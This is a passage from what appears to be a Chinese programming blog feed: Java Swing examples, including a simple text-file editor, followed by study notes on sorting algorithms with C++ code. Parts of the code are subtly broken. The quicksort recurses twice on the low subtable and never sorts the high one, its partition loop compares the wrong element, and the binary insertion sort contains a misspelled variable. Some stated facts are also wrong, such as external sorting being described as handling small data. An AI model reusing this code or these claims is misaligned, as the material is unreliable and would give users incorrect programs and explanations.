<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">jb.addActionListener(<span class="keyword">new</span> ActionListener()&#123;</span><br><span class="line">	<span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">actionPerformed</span><span class="params">(ActionEvent e)</span></span>&#123;</span><br><span class="line">     <span class="comment">//单击鼠标时执行   </span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> javax.swing.*;</span><br><span class="line"><span class="keyword">import</span> java.awt.*;</span><br><span class="line"><span class="keyword">import</span> java.awt.event.ActionEvent;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">jFrameTest</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        JFrame jf=<span class="keyword">new</span> JFrame();</span><br><span class="line">        jf.setBounds(<span class="number">400</span>,<span class="number">300</span>,<span class="number">400</span>,<span class="number">250</span>);</span><br><span class="line">        jf.setLayout(<span class="keyword">new</span> FlowLayout());<span class="comment">//设置网格布局</span></span><br><span class="line">        jf.setTitle(<span class="string">&quot;test&quot;</span>);<span class="comment">//设置标题</span></span><br><span class="line">        JTextArea jTextArea=<span class="keyword">new</span> JTextArea();</span><br><span class="line">        jTextArea.setLineWrap(<span class="keyword">true</span>);</span><br><span class="line">        JButton jButton=<span class="keyword">new</span> JButton(<span class="string">&quot;希望你对你对人生也是这个态度&quot;</span>);</span><br><span class="line">        jf.add(jTextArea);</span><br><span class="line">        jf.add(jButton);</span><br><span class="line">        jButton.addActionListener(<span class="keyword">new</span> AbstractAction() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">actionPerformed</span><span class="params">(ActionEvent e)</span> </span>&#123;</span><br><span class="line">                jTextArea.append(<span class="string">&quot;啊对对对&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line"></span><br><span class="line">        jf.setVisible(<span class="keyword">true</span>);</span><br><span class="line">        jf.setDefaultCloseOperation(WindowConstants.EXIT_ON_CLOSE);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<img src="/images/java-ui/image-20211228141558056.png" alt="image-20211228141558056" style="zoom:67%;" />

<h5 id="综合实践"><a href="#综合实践" class="headerlink" title="综合实践"></a>综合实践</h5><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> javax.swing.*;</span><br><span class="line"><span class="keyword">import</span> javax.swing.filechooser.FileNameExtensionFilter;</span><br><span class="line"><span class="keyword">import</span> java.awt.*;</span><br><span class="line"><span class="keyword">import</span> java.awt.event.ActionEvent;</span><br><span class="line"><span class="keyword">import</span> java.awt.event.ActionListener;</span><br><span class="line"><span class="keyword">import</span> java.io.BufferedReader;</span><br><span class="line"><span class="keyword">import</span> java.io.BufferedWriter;</span><br><span class="line"><span class="keyword">import</span> java.io.FileReader;</span><br><span class="line"><span class="keyword">import</span> java.io.FileWriter;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">S9_2</span> </span>&#123;</span><br><span class="line">    <span class="keyword">static</span> String path;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">readText</span><span class="params">(String path,Object obj)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        JTextArea jTextArea=(JTextArea) obj;</span><br><span class="line">        FileReader fileReader=<span class="keyword">new</span> FileReader(path);</span><br><span class="line">        BufferedReader bufferedReader=<span class="keyword">new</span> BufferedReader(fileReader);</span><br><span class="line"></span><br><span class="line">        String line;</span><br><span class="line">        <span class="keyword">while</span>((line=bufferedReader.readLine())!=<span class="keyword">null</span>)&#123;</span><br><span class="line">            jTextArea.append(line);</span><br><span class="line">        &#125;</span><br><span class="line">        bufferedReader.close();</span><br><span class="line">        fileReader.close();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">saveText</span><span class="params">(String path,Object obj)</span><span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        JTextArea jTextArea=(JTextArea) obj;</span><br><span class="line">        BufferedWriter bufferedWriter=<span class="keyword">new</span> BufferedWriter(<span class="keyword">new</span> FileWriter(path));</span><br><span class="line">        bufferedWriter.write(jTextArea.getText());</span><br><span class="line">        bufferedWriter.flush();</span><br><span class="line">        bufferedWriter.close();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        JFrame jFrame=<span class="keyword">new</span> JFrame(<span class="string">&quot;S9_2&quot;</span>);</span><br><span class="line">        jFrame.setLayout(<span class="keyword">new</span> FlowLayout(FlowLayout.CENTER));</span><br><span class="line">        jFrame.setBounds(<span class="number">500</span>,<span class="number">500</span>,<span class="number">600</span>,<span class="number">500</span>);</span><br><span class="line">        JTextArea jTextArea=<span class="keyword">new</span> JTextArea(<span class="number">20</span>,<span class="number">50</span>);</span><br><span class="line">        JTextField jTextField=<span class="keyword">new</span> JTextField(<span class="number">35</span>);</span><br><span class="line">        <span class="comment">//把文本域放进jScrollPane让其拥有滚动条</span></span><br><span class="line">        JScrollPane jScrollPane=<span class="keyword">new</span> JScrollPane(jTextArea);</span><br><span class="line">        JLabel jLabel=<span class="keyword">new</span> JLabel(<span class="string">&quot;File:&quot;</span>);</span><br><span class="line">        JButton Browse=<span class="keyword">new</span> JButton(<span class="string">&quot;Browse&quot;</span>);</span><br><span class="line">        Browse.addActionListener(<span class="keyword">new</span> ActionListener() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">actionPerformed</span><span class="params">(ActionEvent e)</span> </span>&#123;</span><br><span class="line">                </span><br><span class="line">             	<span class="comment">//文件选择组件</span></span><br><span class="line">                JFileChooser chooser =<span class="keyword">new</span> JFileChooser(<span class="string">&quot;C:/&quot;</span>);</span><br><span class="line">                FileNameExtensionFilter filter = <span class="keyword">new</span> FileNameExtensionFilter(</span><br><span class="line">                        <span class="string">&quot;文本文档&quot;</span>, <span class="string">&quot;txt&quot;</span>);</span><br><span class="line">                chooser.setFileFilter(filter);</span><br><span class="line">                <span class="keyword">int</span> returnVal = chooser.showOpenDialog(jFrame);</span><br><span class="line">                <span class="keyword">if</span>(returnVal == JFileChooser.APPROVE_OPTION) &#123;</span><br><span class="line">                    path=chooser.getSelectedFile().getAbsolutePath();</span><br><span class="line">                    jTextField.setText(path);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">        JButton Clear=<span class="keyword">new</span> JButton(<span class="string">&quot;Clear&quot;</span>);</span><br><span class="line">        Clear.addActionListener(<span class="keyword">new</span> ActionListener() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">actionPerformed</span><span class="params">(ActionEvent e)</span> </span>&#123;</span><br><span class="line">                jTextArea.setText(<span class="string">&quot;&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">        JButton Read=<span class="keyword">new</span> JButton(<span class="string">&quot;Read&quot;</span>);</span><br><span class="line">        Read.addActionListener(<span class="keyword">new</span> ActionListener() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">actionPerformed</span><span class="params">(ActionEvent e)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">try</span>&#123;</span><br><span class="line">                    readText(path,jTextArea);</span><br><span class="line">                &#125;<span class="keyword">catch</span> (Exception ex)&#123;</span><br><span class="line"></span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">        JButton Save=<span class="keyword">new</span> JButton(<span class="string">&quot;Save&quot;</span>);</span><br><span class="line">        Save.addActionListener(<span class="keyword">new</span> ActionListener() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">actionPerformed</span><span class="params">(ActionEvent e)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">try</span>&#123;</span><br><span class="line">                    saveText(path,jTextArea);</span><br><span class="line">                &#125;<span class="keyword">catch</span> (Exception ex)&#123;</span><br><span class="line"></span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">        JButton Exit=<span class="keyword">new</span> JButton(<span class="string">&quot;Exit&quot;</span>);</span><br><span class="line">        Exit.addActionListener(<span class="keyword">new</span> ActionListener() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">actionPerformed</span><span class="params">(ActionEvent e)</span> </span>&#123;</span><br><span class="line">                System.exit(<span class="number">0</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">        <span class="comment">//设置滚动条一直显示</span></span><br><span class="line">        jScrollPane.setVerticalScrollBarPolicy(ScrollPaneConstants.VERTICAL_SCROLLBAR_ALWAYS);</span><br><span class="line">        jFrame.add(jLabel);</span><br><span class="line">        jFrame.add(jTextField);</span><br><span class="line">        jFrame.add(Browse);</span><br><span class="line">        jFrame.add(jScrollPane);</span><br><span class="line">        jFrame.add(Clear);</span><br><span class="line">        jFrame.add(Read);</span><br><span class="line">        jFrame.add(Save);</span><br><span class="line">        jFrame.add(Exit);</span><br><span class="line">        jFrame.setVisible(<span class="keyword">true</span>);</span><br><span class="line">        jFrame.setDefaultCloseOperation(WindowConstants.EXIT_ON_CLOSE);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<img src="/images/java-ui/image-20211229002852293.png" alt="image-20211229002852293" style="zoom:67%;" />
]]></content>
      <categories>
        <category>java</category>
      </categories>
      <tags>
        <tag>java</tag>
        <tag>UI</tag>
      </tags>
  </entry>
  <entry>
    <title>排序</title>
    <url>/2022/01/07/%E6%8E%92%E5%BA%8F/</url>
    <content><![CDATA[<h2 id="排序"><a href="#排序" class="headerlink" title="排序"></a>排序</h2><h4 id="排序的分类"><a href="#排序的分类" class="headerlink" title="排序的分类"></a>排序的分类</h4><h5 id="按照存储介质可以分为"><a href="#按照存储介质可以分为" class="headerlink" title="按照存储介质可以分为:"></a>按照存储介质可以分为:</h5><ul>
<li>内部排序: 数据量不大,数据在内存,无需内外村交换数据</li>
<li>外部排序: 数据量不大,数据在外存 (文件排序)</li>
</ul>
<p>外部排序时,<span id="more"></span>要将数据分批调入内存来排序,中间结果还要及时放入外存,显然外部排序更复杂</p>
<h5 id="按照比较器个数可以分为"><a href="#按照比较器个数可以分为" class="headerlink" title="按照比较器个数可以分为:"></a>按照比较器个数可以分为:</h5><ul>
<li>串行排序: 单处理机 (同一时刻比较一对元素)</li>
<li>并行排序: 多处理机 (同一时刻比较多对元素)</li>
</ul>
<h5 id="按主要操作可分为"><a href="#按主要操作可分为" class="headerlink" title="按主要操作可分为:"></a>按主要操作可分为:</h5><ul>
<li>比较排序:用比较的方法</li>
</ul>
<p>插入排序,交换排序,选择排序,归并排序</p>
<ul>
<li>基数排序:不比较元素的大小,仅仅根据元素本身的取值确定其有序位置</li>
</ul>
<h5 id="按辅助空间可分为"><a href="#按辅助空间可分为" class="headerlink" title="按辅助空间可分为:"></a>按辅助空间可分为:</h5><ul>
<li>原地排序: 辅助空间用量为O(1)的排序方法</li>
</ul>
<p>(所占的辅助存储空间与参加排序的数据量大小无关)</p>
<ul>
<li>非原地排序: 辅助空间用量超过O(1)的排序方法</li>
</ul>
<h5 id="按稳定排序可分为"><a href="#按稳定排序可分为" class="headerlink" title="按稳定排序可分为:"></a>按稳定排序可分为:</h5><ul>
<li>稳定排序:能够使任何数值相等的元素,排序前后相对次序不变</li>
<li>非稳定排序:不是稳定排序的方法</li>
</ul>
<p><strong>排序的稳定性只对结构类型数据排序有意义</strong>,排序方法是否稳定并不能衡量一个排序算法的优劣</p>
<h5 id="按自然性可分为"><a href="#按自然性可分为" class="headerlink" title="按自然性可分为:"></a>按自然性可分为:</h5><ul>
<li>自然排序:输入数据越有序,排序的速度越快的排序方法</li>
<li>非自然排序:不是自然排序的方法</li>
</ul>
<h2 id="插入排序"><a href="#插入排序" class="headerlink" title="插入排序"></a>插入排序</h2><h3 id="直接插入排序"><a href="#直接插入排序" class="headerlink" title="直接插入排序"></a>直接插入排序</h3><p>边插入边排序,保证子序列都是排好序的,选取元素插入到已经有序的序列中</p>
<p>在插入排序中也可以使用哨兵,0号位置做哨兵</p>
<h5 id="性能分析"><a href="#性能分析" class="headerlink" title="性能分析"></a>性能分析</h5><p>基本操作有两个,1.比较关键字大小,2.移动记录</p>
<ul>
<li>最好情况(已经有序)</li>
</ul>
<p>比较次数n-1,移动次数0</p>
<ul>
<li>最坏情况(逆序有序)</li>
</ul>
<p>比较次数n(n-1)/2</p>
<h5 id="时间复杂度"><a href="#时间复杂度" class="headerlink" title="时间复杂度"></a>时间复杂度</h5><p>原始数据越接近有序,排序速度越快</p>
<p>最坏情况下(逆序有序) O(n2)</p>
<p>最好情况,已经有序,0+1+1+1…… -&gt;O(n)</p>
<p>平均情况下耗时差不多是最坏情况的一半O(n2)</p>
<h3 id="折半插入排序"><a href="#折半插入排序" class="headerlink" title="折半插入排序"></a>折半插入排序</h3><p>插入位置为high+1</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">BInsertSort</span><span class="params">(SqList &amp;L)</span></span>&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">2</span>;i&lt;=length;i++)&#123;<span class="comment">//以此插入第2-n个元素</span></span><br><span class="line">        L.r[<span class="number">0</span>]=L.r[i];<span class="comment">//当前插入元素存到哨兵位置</span></span><br><span class="line">        low =<span class="number">1</span>;high=i<span class="number">-1</span>;<span class="comment">//采用二分查找法查找插入位置</span></span><br><span class="line">        <span class="keyword">while</span>(low&lt;=high)&#123;</span><br><span class="line">            mid =(low+high)/<span class="number">2</span>;</span><br><span class="line">            <span class="keyword">if</span>(L.r[<span class="number">0</span>].key&lt;L.r[mid].key)&#123;</span><br><span class="line">                hith = mid - <span class="number">1</span>;           </span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                low =mid +<span class="number">1</span>;</span><br><span class="line">            &#125;            </span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> j=i<span class="number">-1</span>;j&gt;=high+<span class="number">1</span>;--j)&#123;</span><br><span class="line">            L.r[j+<span class="number">1</span>]=L.r[j];<span class="comment">//移动元素</span></span><br><span class="line">        &#125;</span><br><span class="line">        L.r[high+<span class="number">1</span>]=L.r[<span class="number">0</span>];<span class="comment">//插入到正确位置</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>二分插入排序比较次数与待排序的记录的初始排列状态无关</strong></p>
<p>在对象的初始排列已经有序或者接近有序的情况下,直接插入排序比较次数比折半插入排序少</p>
<p>减少了比较次数,不能减少移动次数</p>
<p>平均性能优于直接插入排序</p>
<h5 id="时间复杂度-1"><a href="#时间复杂度-1" class="headerlink" title="时间复杂度"></a>时间复杂度</h5><p>O(n2)</p>
<h5 id="空间复杂度"><a href="#空间复杂度" class="headerlink" title="空间复杂度"></a>空间复杂度</h5><p>O(1)</p>
<p><strong>是一种稳定的排序方法</strong></p>
<h3 id="希尔排序"><a href="#希尔排序" class="headerlink" title="希尔排序"></a>希尔排序</h3><p>基本思想:先将整个待排记录序列分割成若干子序列,分别进行直接插入排序,待整个序列中的记录”基本有序”时,再对全体记录进行一次直接插入排序</p>
<h5 id="特点"><a href="#特点" class="headerlink" title="特点"></a>特点</h5><ul>
<li>一次移动,移动位置较大,跳跃式地接近排序后的最终位置</li>
<li>最后一次只需要少量移动</li>
<li>增量序列必须是递减的,最后一个必须是1</li>
<li>增量序列应该是<strong>互质</strong>的</li>
</ul>
<p>以特定间隔的元素分为一组进行插入排序,最后递减成1间隔的插入排序</p>
<p>步骤</p>
<ul>
<li>1.定义增量序列Dk:DM&gt;DM-1&gt;…&gt;D1=1</li>
<li>2.对每个Dk进行”Dk间隔”插入排序</li>
</ul>
<p>希尔排序算法是一种不稳定的排序算法</p>
<h5 id="时间复杂度-2"><a href="#时间复杂度-2" class="headerlink" title="时间复杂度"></a>时间复杂度</h5><p>O(n1.25)~O(1.6n1.25) —-经验公式</p>
<p>O(Nlog2N) —平均时间复杂度</p>
<p>最差时间复杂度O(n2)</p>
<h5 id="空间复杂度-1"><a href="#空间复杂度-1" class="headerlink" title="空间复杂度"></a>空间复杂度</h5><p>O(1) –本质还是插入排序</p>
<h5 id="注意"><a href="#注意" class="headerlink" title="注意:"></a>注意:</h5><ul>
<li>如何选取最佳增量序列,目前尚未解决</li>
<li>增量因子中除1外没有公因子(也就是增量因子互质)，且最后一个增量因子必须为1</li>
<li>不适合在链式存储结构上实现</li>
</ul>
<h2 id="交换排序"><a href="#交换排序" class="headerlink" title="交换排序"></a>交换排序</h2><h3 id="冒泡排序"><a href="#冒泡排序" class="headerlink" title="冒泡排序"></a>冒泡排序</h3><p><strong>冒泡排序算法是稳定的</strong></p>
<h5 id="冒泡排序算法改进"><a href="#冒泡排序算法改进" class="headerlink" title="冒泡排序算法改进"></a>冒泡排序算法改进</h5><p>如果某一趟发现没有产生任何交换,则说明该序列已经有序,后面的几趟就不需要比了,所以可以做出冒泡算法的改进</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">bubble_sort</span><span class="params">(SqList &amp;L)</span></span>&#123;<span class="comment">//改进的冒泡算法</span></span><br><span class="line">    <span class="keyword">int</span> m,i,j,flag=<span class="number">1</span>;</span><br><span class="line">    RedType x;<span class="comment">//temp变量</span></span><br><span class="line">    <span class="keyword">for</span>(m=<span class="number">1</span>;m&lt;n<span class="number">-1</span>&amp;&amp;flag==<span class="number">1</span>;m++)&#123;</span><br><span class="line">        flag=<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(j=<span class="number">1</span>;j&lt;=m;j++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(L.r[j].key&gt;L.r[j+<span class="number">1</span>].key)&#123;<span class="comment">//发生逆序</span></span><br><span class="line">                flag=<span class="number">1</span>;<span class="comment">//发生交换,flag置为1,若本趟没发生交换,flag保持为0</span></span><br><span class="line">                x=L.r[j];</span><br><span class="line">                L.r[j]=L.r[j+<span class="number">1</span>];</span><br><span class="line">                L.r[j+<span class="number">1</span>]=x;<span class="comment">//交换</span></span><br><span class="line">            &#125;<span class="comment">//endif</span></span><br><span class="line">        &#125;<span class="comment">//for</span></span><br><span class="line">    &#125;<span class="comment">//for</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>优点</strong>:每趟结束时,不仅能挤出一个最大值到最后面位置,还能同时部分理顺其他元素</p>
<h5 id="时间复杂度-3"><a href="#时间复杂度-3" class="headerlink" title="时间复杂度"></a>时间复杂度</h5><ul>
<li>最好情况(正序)<ul>
<li>比较次数:n-1</li>
<li>移动次数:0</li>
</ul>
</li>
</ul>
<p>时间复杂度 O(n)</p>
<ul>
<li>最坏情况(逆序)<ul>
<li>比较次数:1/2(n2-n)</li>
<li>移动次数:3/2(n2-n)</li>
</ul>
</li>
</ul>
<p>时间复杂度O(n2)</p>
<p><strong>平均时间复杂度O(n2)</strong></p>
<p><strong>空间复杂度O(1)</strong></p>
<h3 id="快速排序"><a href="#快速排序" class="headerlink" title="快速排序"></a>快速排序</h3><p><strong>快速排序算法是不稳定的</strong></p>
<p><strong>快速排序算法不是自然排序方法</strong></p>
<h5 id="基本思想"><a href="#基本思想" class="headerlink" title="基本思想:"></a>基本思想:</h5><ul>
<li>任取一个元素为中心(枢轴)</li>
<li>所有比它小的元素往前放,比他大的元素往后放,形成左右两个子表</li>
<li>对各个子表重新选择中心元素并依次规则调整</li>
<li>直到每个子表的元素只剩一个</li>
</ul>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">Partition</span><span class="params">(SqList &amp;L,<span class="keyword">int</span> low,<span class="keyword">int</span> high)</span></span>&#123;</span><br><span class="line">    L.r[<span class="number">0</span>]=L.r[low];</span><br><span class="line">    pivotkey=L.r[low].key;</span><br><span class="line">    <span class="keyword">while</span>(low&lt;high)&#123;</span><br><span class="line">        <span class="keyword">while</span>(low&lt;high&amp;&amp;L.r[high].key&gt;=pivotkey)</span><br><span class="line">            --high;</span><br><span class="line">        L.r[low]=L.r[high];</span><br><span class="line">        <span class="keyword">while</span>(low&lt;high&amp;&amp;L.r[high].key&lt;=pivotkey)</span><br><span class="line">            ++low;</span><br><span class="line">        L.r[high]=L.r[low];</span><br><span class="line">    &#125;</span><br><span class="line">    L.r[low]=L.r[<span class="number">0</span>];</span><br><span class="line">    <span class="keyword">return</span> low;<span class="comment">//返回枢轴最终的位置</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">QSort</span><span class="params">(SqList &amp;L,<span class="keyword">int</span> low,<span class="keyword">int</span> high)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(low &lt;high)&#123;<span class="comment">//low==high即各个子表都只有一个元素</span></span><br><span class="line">        pivotloc=<span class="built_in">Partition</span>(L,low,high);</span><br><span class="line">        <span class="comment">//将L.r[low...high]一分为二,pivotloc为枢轴元素排好序的位置</span></span><br><span class="line">        <span class="built_in">QSort</span>(L,low,pivotloc<span class="number">-1</span>);<span class="comment">//对低子表递归排序</span></span><br><span class="line">        <span class="built_in">QSort</span>(L,low,pivotloc<span class="number">-1</span>);<span class="comment">//对高子表递归排序     </span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="built_in">QSort</span>(L,<span class="number">1</span>,L.length);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h5 id="时间复杂度O-nlog2n"><a href="#时间复杂度O-nlog2n" class="headerlink" title="时间复杂度O(nlog2n)"></a>时间复杂度O(nlog2n)</h5><ul>
<li>QSort(); ——O(log2n)</li>
<li>Partition();——-O(n)</li>
</ul>
<p>实验结果表明,就平均计算时间而言,快速排序是我们所讨论的所有内排序方法中最好的一个</p>
<h5 id="空间复杂度-2"><a href="#空间复杂度-2" class="headerlink" title="空间复杂度"></a>空间复杂度</h5><p>快速排序不是原地排序</p>
<p>由于程序中使用了递归,需要递归调用栈的支持,而栈的长度取决于递归调用的深度,(即使不用递归,也需要用用户栈)</p>
<ul>
<li>在平均情况下需要O(log2n)的栈空间</li>
<li>最快情况下:栈空间可达O(n)</li>
</ul>
<h5 id="注意-1"><a href="#注意-1" class="headerlink" title="注意"></a>注意</h5><ul>
<li>冒泡排序不适合对原本有序或者基本有序的记录序列进行排序,此时会退化成没有改进的<strong>冒泡排序</strong>时间复杂度O(n2)</li>
</ul>
<h3 id="简单选择排序"><a href="#简单选择排序" class="headerlink" title="简单选择排序"></a>简单选择排序</h3><p><strong>简单选择排序算法是不稳定的</strong></p>
<p>基本思想:在待排序的数据中选出最大(小)的元素放在其最终的位置</p>
<p>基本操作</p>
<ol>
<li>首先通过n-1次关键字比较,从n个记录中找出关键字最小的记录,将它与第一个记录交换</li>
<li>再通过n-2次比较,从剩余的n-1个记录中找出关键字次小的记录,将它与第二个记录交换</li>
<li>重复上述操作,共进行n-1趟排序后,排序结束</li>
</ol>
<p>移动次数</p>
<ul>
<li>最好情况 0</li>
<li>最好情况 3(n-1)</li>
</ul>
<p><strong>比较次数是”定”值</strong>n(n-1)/2</p>
<h5 id="时间复杂度-4"><a href="#时间复杂度-4" class="headerlink" title="时间复杂度"></a>时间复杂度</h5><p>O(n2)</p>
<h3 id="堆排序"><a href="#堆排序" class="headerlink" title="堆排序"></a>堆排序</h3><p><strong>堆排序是不稳定的</strong></p>
<p>若在输出对堆顶的最小值(最大值)后,使得剩余n-1个元素的序列又建成一个堆,则得到n个元素的次小值(次大值)….如此反复,便能得到一个有序序列,这个过程称之为堆排序</p>
<h5 id="优点"><a href="#优点" class="headerlink" title="优点"></a>优点</h5><p>在数据元素各种情况下时间复杂度都是O(nlog2n)</p>
<h4 id="如何调整剩余元素成为一个新的堆"><a href="#如何调整剩余元素成为一个新的堆" class="headerlink" title="如何调整剩余元素成为一个新的堆"></a>如何调整剩余元素成为一个新的堆</h4><h5 id="小根堆"><a href="#小根堆" class="headerlink" title="小根堆"></a>小根堆</h5><ol>
<li>输出堆顶元素之后,以堆中最后一个元素替代之,(堆中元素一般用顺序存储结构)</li>
<li>然后将根节点值与左,右子树的根节点值进行比较,并与区中小者进行交换</li>
<li>重复上述操作,直到叶子结点,将得到新的堆,称这个从顶堆至叶子的调整过程为”筛选”</li>
</ol>
<h5 id="大根堆"><a href="#大根堆" class="headerlink" title="大根堆"></a>大根堆</h5><p>同上</p>
<h4 id="堆的建立"><a href="#堆的建立" class="headerlink" title="堆的建立"></a>堆的建立</h4><p>单节点的二叉树是堆</p>
<p>在完全二叉树中所有以叶子结点(序号i&gt;n/2)为根的子树是堆</p>
<p>这样,只需依次将以序号为n/2,n/2-1,n/2-2,…,1的结点为根的子树均调整为堆即可</p>
<h5 id="时间复杂度O-nlog2n-1"><a href="#时间复杂度O-nlog2n-1" class="headerlink" title="时间复杂度O(nlog2n)"></a>时间复杂度O(nlog2n)</h5><p>O(n)+O(nlog2n)=O(nlog2n)</p>
<p>初始化堆所需时间不超过—O(n)</p>
<p>排序阶段(不含初始化堆)—O(nlog2n)</p>
<h5 id="空间复杂度O-1"><a href="#空间复杂度O-1" class="headerlink" title="空间复杂度O(1)"></a>空间复杂度O(1)</h5><h5 id="代码实现"><a href="#代码实现" class="headerlink" title="代码实现"></a>代码实现</h5><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">堆排序</span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Heap</span> &#123;</span><span class="comment">//创建堆对象</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">       <span class="function"><span class="keyword">void</span> <span class="title">heap</span><span class="params">(<span class="keyword">int</span> arr[],<span class="keyword">int</span> lenth,<span class="keyword">int</span> index)</span></span>&#123;<span class="comment">//创建建立大根堆的函数</span></span><br><span class="line">              <span class="keyword">if</span> (lenth &lt;= <span class="number">1</span>)</span><br><span class="line">                      <span class="keyword">return</span>;<span class="comment">//当剩余长度小于等于1的时候推出</span></span><br><span class="line">              <span class="keyword">int</span> left = index * <span class="number">2</span> + <span class="number">1</span>;<span class="comment">//左节点等于父节点*2+1</span></span><br><span class="line">              <span class="keyword">int</span> right = index * <span class="number">2</span> + <span class="number">2</span>;<span class="comment">//右节点等于父节点*2+2</span></span><br><span class="line">              <span class="keyword">int</span> max = index;<span class="comment">//初始化一个max为传入的根节点</span></span><br><span class="line">              <span class="keyword">if</span> (left&lt;lenth &amp;&amp; arr[left]&gt;arr[max])</span><br><span class="line">                      max = left;<span class="comment">//判断子节点是否大于父节点,并且更改max指向的值</span></span><br><span class="line">              <span class="keyword">if</span> (right&lt;lenth &amp;&amp; arr[right]&gt;arr[max])</span><br><span class="line">                      max = right;</span><br><span class="line">              <span class="keyword">if</span> (arr[index] != arr[max]) &#123;<span class="comment">//判断根节点是否为最大值,若不是则交换</span></span><br><span class="line">                      <span class="built_in">swap</span>(arr[index], arr[max]);</span><br><span class="line">                      <span class="built_in">heap</span>(arr, lenth, max);<span class="comment">//递归调用,将</span></span><br><span class="line">              &#125;</span><br><span class="line">                             </span><br><span class="line">       &#125;</span><br><span class="line">       <span class="function"><span class="keyword">void</span> <span class="title">heapSort</span><span class="params">(<span class="keyword">int</span> arr[], <span class="keyword">int</span> size)</span> </span>&#123;</span><br><span class="line">              <span class="keyword">for</span> (<span class="keyword">int</span> i = size / <span class="number">2</span> - <span class="number">1</span>; i &gt;= <span class="number">0</span>; i--) &#123;</span><br><span class="line">                      <span class="built_in">heap</span>(arr, size, i);<span class="comment">//建立一个大根堆</span></span><br><span class="line">              &#125;</span><br><span class="line">              <span class="keyword">for</span> (<span class="keyword">int</span> i = size - <span class="number">1</span>; i &gt;= <span class="number">1</span>; i--) &#123;</span><br><span class="line">                      <span class="built_in">swap</span>(arr[<span class="number">0</span>], arr[i]);</span><br><span class="line">                      <span class="built_in">heap</span>(arr, i, <span class="number">0</span>);<span class="comment">//重新调整大根堆</span></span><br><span class="line">              &#125;</span><br><span class="line">       